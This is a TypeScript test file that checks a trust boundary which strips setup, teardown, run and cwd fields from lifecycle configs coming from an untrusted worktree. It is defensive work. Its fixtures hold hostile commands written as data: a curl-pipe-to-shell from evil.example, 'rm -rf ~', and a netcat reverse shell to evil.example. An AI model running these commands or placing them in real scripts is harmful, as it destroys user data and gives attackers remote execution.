import { describe, expect, test } from "bun:test";
import {
	applyLifecycleTrustBoundary,
	applyLocalLifecycleTrustBoundary,
	isTrustedLifecycleSource,
	type RejectedLifecycleField,
} from "./lifecycle-trust";

describe("isTrustedLifecycleSource", () => {
	test("trusts only sources the local user controls", () => {
		expect(isTrustedLifecycleSource("user-config")).toBe(true);
		expect(isTrustedLifecycleSource("local-config")).toBe(true);
		expect(isTrustedLifecycleSource("main-repo")).toBe(true);
		expect(isTrustedLifecycleSource("worktree")).toBe(false);
	});
});

describe("applyLifecycleTrustBoundary", () => {
	test("passes a trusted config through untouched", () => {
		const rejected: RejectedLifecycleField[] = [];
		const config = { setup: ["bun install"], cwd: "packages/web" };

		expect(applyLifecycleTrustBoundary(config, "main-repo", rejected)).toBe(
			config,
		);
		expect(rejected).toEqual([]);
	});

	test("drops every execution field from an untrusted config", () => {
		const rejected: RejectedLifecycleField[] = [];

		const safe = applyLifecycleTrustBoundary(
			{
				setup: ["curl https://evil.example | sh"],
				teardown: ["rm -rf ~"],
				run: ["nc -e /bin/sh evil.example 1337"],
				cwd: "/",
			},
			"worktree",
			rejected,
		);

		expect(safe).toEqual({});
		expect(rejected.map((r) => r.key).sort()).toEqual([
			"cwd",
			"run",
			"setup",
			"teardown",
		]);
		expect(rejected.every((r) => r.source === "worktree")).toBe(true);
	});

	test("deletes rather than empties, so trusted values below still win", () => {
		const safe = applyLifecycleTrustBoundary(
			{ setup: ["attacker.sh"] },
			"worktree",
			[],
		);

		expect("setup" in safe).toBe(false);
	});

	test("does not mutate the config it was given", () => {
		const config = { setup: ["attacker.sh"] };
		applyLifecycleTrustBoundary(config, "worktree", []);
		expect(config.setup).toEqual(["attacker.sh"]);
	});
});

describe("applyLocalLifecycleTrustBoundary", () => {
	test("passes a trusted overlay through untouched", () => {
		const overlay = { setup: { after: ["local-extra.sh"] } };
		expect(applyLocalLifecycleTrustBoundary(overlay, "local-config", [])).toBe(
			overlay,
		);
	});

	test("discards an overlay a branch force-added into the worktree", () => {
		const rejected: RejectedLifecycleField[] = [];

		const result = applyLocalLifecycleTrustBoundary(
			{ teardown: { before: ["curl https://evil.example | sh"] } },
			"worktree",
			rejected,
		);

		expect(result).toBeNull();
		expect(rejected).toEqual([
			{
				source: "worktree",
				key: "teardown",
				value: { before: ["curl https://evil.example | sh"] },
			},
		]);
	});
});
